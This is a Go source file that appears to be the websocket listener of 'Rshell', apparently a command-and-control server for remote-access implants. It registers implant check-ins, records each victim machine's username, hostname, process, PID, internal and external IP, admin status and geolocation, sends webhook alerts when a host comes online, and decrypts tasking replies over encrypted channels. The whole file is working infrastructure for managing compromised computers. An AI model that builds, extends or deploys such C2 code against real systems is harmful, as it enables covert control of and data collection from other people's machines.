package websocket

import (
	"Rshell/pkg/connection"
	"Rshell/pkg/connection/base"
	"Rshell/pkg/database"
	"Rshell/pkg/encrypt"
	"Rshell/pkg/logger"
	"Rshell/pkg/qqwry"
	"Rshell/pkg/utils"
	"Rshell/pkg/webhooks"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"net"
	"net/http"
	"strconv"
	"sync"
	"time"

	"github.com/gorilla/websocket"
)

var upgrader = websocket.Upgrader{
	CheckOrigin: func(r *http.Request) bool {
		return true
	},
}

// WSClient structure
type WSClient struct {
	Conn            *websocket.Conn
	UID             string
	WriteMu         sync.Mutex
	StopChan        chan struct{}
	LastHeartbeat   time.Time
	TimeoutCount    int
	IsClosed        bool
	CloseOnce       sync.Once
	PingTicker      *time.Ticker
	HeartbeatTicker *time.Ticker
}

// ClientManager global connection manager
type ClientManager struct {
	Clients map[string]*WSClient
	Mu      sync.RWMutex
}

var (
	globalClientManager = &ClientManager{
		Clients: make(map[string]*WSClient),
	}
)

// Add client to manager
func (cm *ClientManager) Add(uid string, client *WSClient) {
	cm.Mu.Lock()
	defer cm.Mu.Unlock()
	cm.Clients[uid] = client
	logger.Info("Client added:", uid, "Total clients:", len(cm.Clients))
}

// Remove client from manager
func (cm *ClientManager) Remove(uid string) {
	cm.Mu.Lock()
	defer cm.Mu.Unlock()
	if client, exists := cm.Clients[uid]; exists {
		if !client.IsClosed {
			client.Close()
		}
		delete(cm.Clients, uid)
		logger.Info("Client removed:", uid, "Total clients:", len(cm.Clients))
	}
}

// Get client from manager
func (cm *ClientManager) Get(uid string) (*WSClient, bool) {
	cm.Mu.RLock()
	defer cm.Mu.RUnlock()
	client, exists := cm.Clients[uid]
	return client, exists
}

// CloseAll clients
func (cm *ClientManager) CloseAll() {
	cm.Mu.Lock()
	defer cm.Mu.Unlock()
	for uid, client := range cm.Clients {
		if !client.IsClosed {
			client.Close()
		}
		delete(cm.Clients, uid)
	}
}

// Close safely closes the WSClient
func (c *WSClient) Close() {
	c.CloseOnce.Do(func() {
		c.IsClosed = true

		if c.PingTicker != nil {
			c.PingTicker.Stop()
		}
		if c.HeartbeatTicker != nil {
			c.HeartbeatTicker.Stop()
		}

		close(c.StopChan)

		if c.Conn != nil {
			c.Conn.Close()
		}

		if c.UID != "" {
			globalClientManager.Mu.Lock()
			delete(globalClientManager.Clients, c.UID)
			globalClientManager.Mu.Unlock()
		}

		base.MarkOffline(c.UID)
	})
}

// WriteMessage safely sends a WebSocket message
func (c *WSClient) WriteMessage(message []byte) error {
	c.WriteMu.Lock()
	defer c.WriteMu.Unlock()

	if c.IsClosed {
		return fmt.Errorf("connection closed")
	}

	c.Conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
	return c.Conn.WriteMessage(websocket.BinaryMessage, message)
}

// startPing starts the Ping ticker
func (c *WSClient) startPing() {
	defer func() {
		if r := recover(); r != nil {
			logger.Error("Ping goroutine panic recovered:", r)
		}
	}()

	for {
		select {
		case <-c.PingTicker.C:
			if c.IsClosed {
				return
			}
			c.WriteMu.Lock()
			c.Conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
			if err := c.Conn.WriteMessage(websocket.PingMessage, nil); err != nil {
				c.WriteMu.Unlock()
				logger.Info("Ping failed, closing connection for client:", c.UID, "Error:", err)
				c.Close()
				return
			}
			c.WriteMu.Unlock()
		case <-c.StopChan:
			return
		}
	}
}

// startHeartbeatCheck monitors client heartbeats
func (c *WSClient) startHeartbeatCheck() {
	if c.HeartbeatTicker == nil {
		c.HeartbeatTicker = time.NewTicker(30 * time.Second)
	}

	for range c.HeartbeatTicker.C {
		if c.IsClosed {
			return
		}

		elapsed := time.Since(c.LastHeartbeat)
		if elapsed > 90*time.Second {
			c.TimeoutCount++
			logger.Warn(fmt.Sprintf("Heartbeat timeout for client: %s Timeout count: %d Elapsed: %v",
				c.UID, c.TimeoutCount, elapsed))

			if c.TimeoutCount >= 5 {
				logger.Info(fmt.Sprintf("Max heartbeat timeout reached (%d), closing connection for client: %s",
					c.TimeoutCount, c.UID))
				c.Close()
				return
			}
		} else {
			c.TimeoutCount = 0
		}
	}
}

// HandleWebSocket handles WebSocket connections
func HandleWebSocket(w http.ResponseWriter, r *http.Request) {
	logger.Info("New WebSocket connection attempt from:", r.RemoteAddr)

	defer func() {
		if r := recover(); r != nil {
			logger.Error("WebSocket handler panic recovered:", r)
		}
	}()

	ws, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		logger.Error("WebSocket upgrade failed:", err)
		return
	}

	logger.Info("WebSocket connection established from:", r.RemoteAddr)

	client := &WSClient{
		Conn:          ws,
		StopChan:      make(chan struct{}),
		LastHeartbeat: time.Now(),
		IsClosed:      false,
	}

	defer func() {
		client.Close()
		logger.Info("WebSocket handler finished for:", r.RemoteAddr)
	}()

	ws.SetReadDeadline(time.Now().Add(60 * time.Second))
	ws.SetPongHandler(func(string) error {
		ws.SetReadDeadline(time.Now().Add(60 * time.Second))
		return nil
	})

	client.PingTicker = time.NewTicker(30 * time.Second)
	go client.startPing()

	for {
		if client.IsClosed {
			break
		}

		messageType, message, err := ws.ReadMessage()
		if err != nil {
			if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
				logger.Info("WebSocket closed unexpectedly:", err, "from:", r.RemoteAddr)
			} else if websocket.IsCloseError(err) {
				logger.Info("WebSocket closed normally from:", r.RemoteAddr)
			} else if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				logger.Info("WebSocket read timeout from:", r.RemoteAddr)
			} else {
				logger.Error("WebSocket read error:", err, "from:", r.RemoteAddr)
			}
			break
		}

		if messageType != websocket.BinaryMessage {
			logger.Warn("Received non-binary message, ignoring from:", r.RemoteAddr)
			continue
		}

		if len(message) == 0 || len(message) < 4 {
			continue
		}

		msgType := binary.BigEndian.Uint32(message[:4])

		switch msgType {
		case 1: // firstBlood
			if len(message) < 5 {
				break
			}

			msg := message[4:]
			if len(msg) == 0 {
				break
			}

			tmpMetainfo, err := encrypt.DecodeBase64(msg)
			if err != nil {
				break
			}

			metainfo, err := encrypt.DecryptNormal(tmpMetainfo)
			if err != nil {
				break
			}

			if len(metainfo) < 9 {
				break
			}

			uid := encrypt.BytesToMD5(metainfo)
			client.UID = uid
			client.LastHeartbeat = time.Now()
			client.TimeoutCount = 0

			globalClientManager.Add(uid, client)
			connection.GlobalManager.SetListenerType(uid, "websocket")

			client.HeartbeatTicker = time.NewTicker(10 * time.Second)
			go client.startHeartbeatCheck()

			var existingClient database.Clients
			exists, _ := database.Engine.Where("uid = ?", uid).Get(&existingClient)

			if !exists {
				publicKey := metainfo[:32]
				remaining := metainfo[32:]
				if len(remaining) < 9 {
					break
				}

				processID := binary.BigEndian.Uint32(remaining[:4])
				flag := int(remaining[4])
				ipInt := binary.LittleEndian.Uint32(remaining[5:9])
				localIP := utils.Uint32ToIP(ipInt).String()

				var osInfo string
				if len(remaining) > 9 {
					osInfo = string(remaining[9:])
				}

				hostName, userName, processName := base.SafeSplitOSInfo(osInfo)

				externalIp, _, err := net.SplitHostPort(r.RemoteAddr)
				if err != nil {
					externalIp = r.RemoteAddr
				}
				if externalIp == "::1" {
					externalIp = "127.0.0.1"
				}
				if net.ParseIP(externalIp) == nil {
					externalIp = "0.0.0.0"
				}

				address, _ := qqwry.GetLocationByIP(externalIp)

				arch := "x86"
				if flag > 8 {
					userName += "*"
					flag = flag - 8
				}
				if flag > 4 {
					arch = "x64"
				}

				formattedTime := time.Now().Format("01-02 15:04")

				c := database.Clients{
					Uid:        uid,
					FirstStart: formattedTime,
					ExternalIP: externalIp,
					InternalIP: localIP,
					Username:   userName,
					Computer:   hostName,
					Process:    processName,
					Pid:        strconv.Itoa(int(processID)),
					Address:    address,
					Arch:       arch,
					Note:       "",
					Sleep:      "0",
					Online:     "1",
					Color:      "",
					PublicKey:  base64.StdEncoding.EncodeToString(publicKey[:]),
				}
				encrypt.PublicKeyMap[uid] = base64.StdEncoding.EncodeToString(publicKey[:])
				database.Engine.Insert(&c)
				database.Engine.Insert(&database.Shell{Uid: uid, ShellContent: ""})
				database.Engine.Insert(&database.Notes{Uid: uid, Note: ""})

				go webhooks.NotifyOnline(c)
				logger.Info("New client registered:", uid, "IP:", externalIp)
			} else {
				base.ReconnectClient(uid)
			}

		case 2: // otherMsg
			if len(message) < 8 {
				break
			}

			msg := message[4:]
			if len(msg) < 4 {
				break
			}

			metaLen := binary.BigEndian.Uint32(msg[:4])
			if metaLen > uint32(len(msg)-4) || metaLen == 0 {
				break
			}

			metaMsg := msg[4 : 4+metaLen]
			realMsg := msg[4+metaLen:]

			if len(realMsg) == 0 {
				break
			}

			tmpMetainfo, err := encrypt.DecodeBase64(metaMsg)
			if err != nil {
				break
			}

			metainfo, err := encrypt.DecryptNormal(tmpMetainfo)
			if err != nil {
				break
			}

			uid := encrypt.BytesToMD5(metainfo)

			if _, exists := globalClientManager.Get(uid); !exists {
				logger.Warn("Received message from offline client:", uid)
				break
			}

			dataBytes, err := encrypt.DecodeBase64(realMsg)
			if err != nil {
				break
			}

			dataBytes, err = encrypt.Decrypt(dataBytes, uid)
			if err != nil {
				break
			}

			dataBytes, err = encrypt.Decrypt(dataBytes, uid)
			if err != nil {
				break
			}

			if len(dataBytes) < 4 {
				break
			}

			replyTypeBytes := dataBytes[:4]
			data := dataBytes[4:]
			replyType := binary.BigEndian.Uint32(replyTypeBytes)

			handler := base.ReplyHandler{UID: uid}
			handler.Handle(replyType, data)

		case 3: // heartBeat
			if len(message) < 5 {
				break
			}

			msg := message[4:]
			if len(msg) == 0 {
				break
			}

			tmpMetainfo, err := encrypt.DecodeBase64(msg)
			if err != nil {
				break
			}

			metainfo, err := encrypt.DecryptNormal(tmpMetainfo)
			if err != nil {
				break
			}

			uid := encrypt.BytesToMD5(metainfo)

			if c, exists := globalClientManager.Get(uid); exists && !c.IsClosed {
				c.LastHeartbeat = time.Now()
				c.TimeoutCount = 0
			}

		default:
			logger.Warn("Unknown message type:", msgType, "from:", r.RemoteAddr)
		}
	}
}

// Cleanup global cleanup function
func Cleanup() {
	logger.Info("Starting WebSocket cleanup...")
	globalClientManager.CloseAll()
	logger.Info("WebSocket cleanup completed")
}

// GetClientStats get client statistics
func GetClientStats() map[string]interface{} {
	globalClientManager.Mu.RLock()
	defer globalClientManager.Mu.RUnlock()

	stats := make(map[string]interface{})
	stats["total_clients"] = len(globalClientManager.Clients)

	onlineCount := 0
	for _, client := range globalClientManager.Clients {
		if !client.IsClosed {
			onlineCount++
		}
	}
	stats["online_clients"] = onlineCount

	return stats
}

// GetClient get specific client
func GetClient(uid string) *WSClient {
	if client, exists := globalClientManager.Get(uid); exists && !client.IsClosed {
		return client
	}
	return nil
}

// SendToClient send message to specific client
func SendToClient(uid string, message []byte) error {
	client := GetClient(uid)
	if client == nil {
		return fmt.Errorf("client not found or offline")
	}

	return client.WriteMessage(message)
}
